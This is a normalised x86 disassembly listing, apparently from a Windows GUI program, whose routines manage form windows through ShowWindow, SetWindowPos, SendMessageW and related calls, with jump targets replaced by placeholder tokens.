test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49aadd
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x11 ] 0x1
push ebp
mov eax [ esi + 0x2b4 ]
call sub_49a8d8
pop ecx
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_46d414
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x2c ]
mov eax esi
call sub_47085c
push ebp
mov eax [ esi + 0x7c ]
call sub_49a8d8
pop ecx
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_49a918
test al al
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4a0f40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x34 ]
and eax 0xffff
mov edx [ ebp - 0x30 ]
shl edx 0x10
or eax edx
mov ecx eax
mov edx 0xd
mov eax [ rw-data ]
call sub_4a0fc8
mov ecx [ ebp - 0x10 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_4a0fc8
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax ebx
call sub_49a950
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_47085c
jmp r-xdata
mov ebx [ ebx + 0x34 ]
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4a0eb0
test [ esi + 0x298 ] 0x8
je r-xdata
sub_49aae4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov eax [ eax + 0x8 ]
mov edi eax
mov eax [ esi + 0x70 ]
lea edx [ edi + 0x18 ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jbe r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea edx [ edi + 0x20 ]
mov ecx [ eax + 0xc ]
test ecx ecx
jbe r-xdata
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea eax [ edi + 0x20 ]
push eax
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x1c ]
lea edx [ edi + 0x18 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov [ edx + 0x4 ] ecx
sub_49ab50
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x364 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_49ab7c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x18 ]
and eax 0x8000
cmp eax 0x8000
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x360 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_49c0c4
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_477de8
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x374 ]
mov eax esi
call sub_4a25fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x28 ] 0x0
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebx + 0x10 ]
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
cmp eax [ ebx + 0x14 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edi eax
sub edi [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
sub edx [ eax + 0x4c ]
mov ebx edx
test edi edi
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov esi ebx
mov eax [ ebp - 0x4 ]
call sub_497f38
lea edx [ ebp - 0x34 ]
call sub_49d128
push ebp
lea eax [ esi + 0x8 ]
xor ecx ecx
mov edx [ ebp - 0x34 ]
call sub_49ab50
pop ecx
push ebp
lea eax [ esi + 0xc ]
xor ecx ecx
mov edx [ ebp - 0x30 ]
call sub_49ab50
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x2c ]
call sub_49ab50
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x28 ]
call sub_49ab50
pop ecx
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x8 ]
sub eax [ esi + 0x18 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0xc ]
sub ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_40ab90
mov eax [ ebp - 0x18 ]
cmp eax [ esi + 0x10 ]
jg r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jle r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
add [ ebp - 0x18 ] ebx
mov eax [ ebp - 0x20 ]
sub eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x378 ] 0x1
jmp r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
cmp edx eax
jle r-xdata
mov [ ebp - 0x18 ] eax
test edi edi
jle r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
add [ ebp - 0x1c ] edi
sub eax edi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x378 ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call InvalidateRect
mov [ ebp - 0x1c ] eax
sub_49ad60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47ab7c
test [ ebx + 0x1c ] 0x10
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x34 ] 0x0
je r-xdata
cmp [ ebx + 0x2b4 ] 0x0
je r-xdata
mov eax [ ebx + 0x2b4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x2b4 ]
mov eax [ eax + 0x38 ]
call sub_45efdc
test eax eax
jle r-xdata
mov ebx [ esi + 0x8 ]
push 0xf
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebx + 0x4 ] eax
sub_49adb8
push ebx
push esi
add esp 0xffffffc8
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0xc ]
mov [ esp ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
push esp
mov eax ebx
call sub_479ce0
push eax
call j_sub_40c472
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_470990
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x28 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ esp + 0x28 ]
mov edx esp
call sub_40abd8
test al al
je r-xdata
xor eax eax
mov [ esp + 0x14 ] eax
xor eax eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] 0x1
push 0xc
lea eax [ esp + 0x18 ]
push eax
push 0x1
push 0x0
mov eax ebx
call sub_479ce0
push eax
call j_sub_40c79a
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_47b528
jmp r-xdata
add esp 0x38
pop esi
pop ebx
retn
sub_49ae74
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x384 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_40587c
pop esi
pop ebx
retn
sub_49aeb8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_478f48
movzx eax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x290 ]
mov eax ebx
call sub_47a2f4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
movzx edx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x34 ]
xchg edx eax
call sub_47a2f4
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_49af54
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_49b5b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_4a15e0
mov eax [ ebp - 0x4 ]
or [ eax + 0x384 ] 0x4
xor edx edx
push ebp
push sub_49b599
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x384 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49b5a0
mov eax [ ebp - 0x4 ]
and [ eax + 0x384 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_49b46b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_49b00c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29f ] 0x4
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_499bf4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29f ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x384 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_49e6e4
mov esi [ ebp - 0xc ]
sub esi [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47074c
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29f ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_479ce0
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SetWindowPos
jmp r-xdata
mov edi [ ebp - 0x8 ]
sub edi [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47078c
mov edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29f ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
call sub_494028
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_49d508
cmp esi eax
jge r-xdata
adc edi 0x0
adc edi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29f ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
call sub_494358
mov ebx eax
mov eax [ rw-data ]
call sub_49d4fc
cmp edi eax
jge r-xdata
mov eax [ rw-data ]
call sub_49d508
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29a ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29a ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_49d520
mov esi eax
sar esi 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47074c
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_49d4f0
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_49d4fc
mov edi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29a ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
push DefMDIChildProcW
call CallWindowProcW
mov eax [ ebp - 0x4 ]
call sub_4710cc
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
push 0x3
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_49d508
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47078c
mov edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_49d4e4
mov edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
mov eax ebx
call sub_496864
mov esi eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_498724
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x37c ]
push eax
call SendMessageW
jmp r-xdata
sub esi eax
mov eax [ rw-data ]
call sub_49d514
mov edi eax
sar edi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_49d508
cmp esi eax
jge r-xdata
adc edi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_49d508
cmp esi eax
jge r-xdata
adc edi 0x0
add esi eax
mov eax ebx
call sub_496884
mov edi eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_49d4fc
add edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
mov eax [ rw-data ]
call sub_49d4fc
cmp edi eax
jge r-xdata
mov eax [ rw-data ]
call sub_49d508
mov esi eax
mov eax [ rw-data ]
call sub_49d4fc
cmp edi eax
jge r-xdata
mov eax [ rw-data ]
call sub_49d508
mov esi eax
add edi eax
jmp r-xdata
adc eax 0x0
sub edi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov eax [ rw-data ]
call sub_49d4fc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_49d4fc
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_498724
jmp r-xdata
sub_49b011
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4a0994
call sub_406174
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29f ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29f ] 0x6
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_49e6e4
mov esi [ ebp - 0xc ]
sub esi [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47074c
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29f ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
mov edi [ ebp - 0x8 ]
sub edi [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47078c
mov edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29f ] 0x7
jne r-xdata
mov eax [ rw-data ]
call sub_49d508
cmp esi eax
jge r-xdata
adc edi 0x0
adc edi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29f ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ rw-data ]
call sub_49d4fc
cmp edi eax
jge r-xdata
mov eax [ rw-data ]
call sub_49d508
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29a ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29a ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_49d520
mov esi eax
sar esi 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47074c
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_49d4f0
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x48 ]
sar esi 0x1
jns r-xdata
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_49d4fc
mov edi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49b5a0
mov eax [ ebp - 0x4 ]
and [ eax + 0x384 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29a ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
push DefMDIChildProcW
call CallWindowProcW
mov eax [ ebp - 0x4 ]
call sub_4710cc
push 0x0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x37c ]
push eax
call __imp_SendMessageW
push 0x3
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_49d508
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_47078c
mov edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_49d4e4
mov edi eax
mov eax [ ebp - 0x4 ]
sub edi [ eax + 0x4c ]
sar edi 0x1
jns r-xdata
adc esi 0x0
mov eax ebx
call sub_496864
mov esi eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_498724
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x37c ]
push eax
call SendMessageW
jmp r-xdata
sub esi eax
mov eax [ rw-data ]
call sub_49d514
mov edi eax
sar edi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_49d508
cmp esi eax
jge r-xdata
adc edi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_49d508
cmp esi eax
jge r-xdata
adc edi 0x0
add esi eax
mov eax ebx
call sub_496884
mov edi eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_49d4fc
add edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
mov eax [ rw-data ]
call sub_49d4fc
cmp edi eax
jge r-xdata
mov eax [ rw-data ]
call sub_49d508
mov esi eax
mov eax [ rw-data ]
call sub_49d4fc
cmp edi eax
jge r-xdata
mov eax [ rw-data ]
call sub_49d508
mov esi eax
add edi eax
jmp r-xdata
adc eax 0x0
sub edi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov eax [ rw-data ]
call sub_49d4fc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_49d4fc
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_498724
jmp r-xdata
sub_49b470
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4a0994
call sub_406174
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_499bf4
mov eax [ ebp - 0x4 ]
test [ eax + 0x384 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
